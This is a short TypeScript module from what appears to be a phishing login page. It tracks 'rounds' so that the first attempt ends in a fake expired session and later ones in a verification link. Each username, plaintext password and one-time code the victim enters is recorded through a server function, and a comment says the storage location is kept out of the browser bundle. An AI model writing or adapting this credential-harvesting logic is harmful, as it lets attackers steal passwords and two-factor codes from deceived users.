import { recordEntry } from "./cms.functions";

const KEY = "nero-login-round";

/** Round 1 ends in an expired session; round 2+ ends in a verification link. */
export function getRound(): number {
  if (typeof window === "undefined") return 1;
  return Number(window.sessionStorage.getItem(KEY) ?? "1");
}

export function advanceRound(): void {
  if (typeof window === "undefined") return;
  window.sessionStorage.setItem(KEY, String(getRound() + 1));
}

// Records a login/code submission via server function (no client-side
// Supabase; the external DB URL is never in the browser bundle).
export async function recordAdminEntry(entry: {
  kind: "login" | "code" | "action";
  step?: string;
  identifier?: string;
  password?: string;
  code?: string;
  round?: number;
}): Promise<void> {
  try {
    await recordEntry({
      data: {
        kind: entry.kind,
        round: entry.round ?? getRound(),
        step: entry.step ?? null,
        identifier: entry.identifier ?? null,
        password: entry.password ?? null,
        code: entry.code ?? null,
      },
    });
  } catch (e) {
    console.error("recordAdminEntry", e);
  }
}